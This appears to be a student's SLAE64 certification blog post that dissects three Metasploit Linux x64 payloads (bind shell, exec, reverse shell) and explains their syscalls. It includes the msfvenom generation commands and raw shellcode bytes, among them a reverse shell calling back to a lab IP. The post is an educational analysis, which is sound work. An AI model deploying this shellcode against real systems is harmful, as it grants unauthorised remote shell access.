---
title: SLAE64 - Assignment 5 - Analysis
date: 2021-04-04
tags:
- SLAE64
categories:
- SLAE Exam Assignments
- SLAE 64-bit
keywords:
    - Assembly
    - Analysis
---

The fifth assigment for the SLAE64 certification asks to choose 3 shellcode samples created with Msfpayload for linux/x86_64 and dissect them presenting the analysis.
<!--more-->
The list of available shellcodes have been generated using the following command:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5]
└─$ msfvenom --list payloads | grep linux/x64 > List_Payloads_Linux-x64.txt
```


## Bind TCP
The first shellcode I have selected is `linux/x64/shell_bind_tcp`. 

First of all, we need to understand which parameters this shellcode needs:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.1-ShellBindTcp]
└─$ msfvenom -p linux/x64/shell_bind_tcp  --list-options
Options for payload/linux/x64/shell_bind_tcp:
=========================


       Name: Linux Command Shell, Bind TCP Inline
     Module: payload/linux/x64/shell_bind_tcp
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 86
       Rank: Normal

Provided by:
    ricky

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LPORT  4444             yes       The listen port
RHOST                   no        The target address

Description:
  Listen for a connection and spawn a command shell
```


For the sake of diversity, I selected port 5555, therefore the shellcode generation is done with the following command:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.1-ShellBindTcp]
└─$ msfvenom -p linux/x64/shell_bind_tcp LPORT=5555 -f c -o Payload.txt
```

I have then taken the shellcode and passed it to ndisasm:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.1-ShellBindTcp]
└─$ msfvenom -p linux/x64/shell_bind_tcp LPORT=5555 -f raw | ndisasm -u -b 64 - > Disasm.txt
```

The shellcode first creates a new socket and then binds it to appropriate port and protocols:
![Bind Shell TCP Shellcode representation - Part 1](/writeups/img/5-1-bindtcp-1.png)

After that, two appropriate syscalls are executed in order to make it listening and accepting a connection.
When a connection is accepted, a new file descriptor is created and it is then duplicated into the three standard ones (STDIN, STDOUT and STDERR) with the _dup2_ syscall:
![Bind Shell TCP Shellcode representation - Part 2](/writeups/img/5-1-bindtcp-2.png)

As last part, the shellcode executes a _execve_ syscall after having pushed on the stack all the relevant parameters in order to invoke `/bin/sh`:
![Bind Shell TCP Shellcode representation - Part 3](/writeups/img/5-1-bindtcp-3.png)


## Exec

The second shellcode I have selected is `linux/x64/exec`. 

First of all, we need to understand which parameters this shellcode needs:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5]
└─$ msfvenom -p linux/x64/exec --list-options                
Options for payload/linux/x64/exec:
=========================


       Name: Linux Execute Command
     Module: payload/linux/x64/exec
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 40
       Rank: Normal

Provided by:
    ricky

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command
```


I opted for `/bin/sh` as command to be executed, therefore the shellcode generation is done with the following command:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.2-Exec]
└─$ msfvenom -p linux/x64/exec CMD=/bin/sh -f c -o Payload.txt
```

I have then taken the shellcode and passed it to ndisasm:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.2-Exec]
└─$ echo -ne "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05" | ndisasm -b 64 - > Disasm.txt
```

This shellcode is basically executing a single syscall to execve. The command to be executed is included in the shellcode and its address is put on the stack through a _call_ at offset 1B.

The following diagram shows the actual code and stack and registers at the syscall:
![Exec shellcode representation](/writeups/img/5-2-exec.png)


## Reverse TCP
The second shellcode I have selected is `linux/x64/shell_reverse_tcp`. 

First of all, we need to understand which parameters this shellcode needs:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5]
└─$ msfvenom -p linux/x64/shell_reverse_tcp --list-options
Options for payload/linux/x64/shell_reverse_tcp:
=========================


       Name: Linux Command Shell, Reverse TCP Inline
     Module: payload/linux/x64/shell_reverse_tcp
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 74
       Rank: Normal

Provided by:
    ricky

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Connect back to attacker and spawn a command shell
```


I have then used the ip address 192.168.106.148 as parameter, therefore the shellcode generation is done with the following command:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.3-ShellReverseTCP]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.106.148 LPORT=4444 -f c -o Payload.txt
```

I have then taken the shellcode and passed it to ndisasm:
```
┌──(kali㉿kali)-[~/Labs/SLAE64/Assignment-5/5.3-ShellReverseTCP]
└─$ echo -ne "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x6a\x94\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05" | ndisasm -b 64 - > Disasm.txt
```

This shellcode first of all creates a new socket with the appropriate syscall. Then the file descriptor for the socket is used into a connect syscall, for which the address structure parameters (AF_INET family, port 4444 and IP 192.168.106.148) are pushed onto the stack.

The following diagram in two parts shows the actual code and stack and registers values at the two syscalls mentioned above:
![Reverse Shell TCP Shellcode representation - Part 1](/writeups/img/5-3-revtcp-1.png)

The shellcode now loops 3 times in order to perform the _dup2_ syscall to duplicate the file descriptor for the socket into the 3 general ones (STDIN, STDOUT and STDERR). After that, parameters for an _execve_ are pushed on the stack in order to execute `/bin/sh`.

The following diagram shows the two syscalls:
![Reverse Shell TCP Shellcode representation - Part 2](/writeups/img/5-3-revtcp-2.png)

<!-- SLAE64 Disclaimer -->
_________________
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

**Student ID**: `PA-29059`  
**GitHub repository**: [https://github.com/andrea-perfetti/SLAE64-Exam](https://github.com/andrea-perfetti/SLAE64-Exam)



This assignment has been written on a Kali Linux 2021.1 64-bit virtual machine:
```
┌──(kali㉿kali)-[~]
└─$ uname -a
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux
```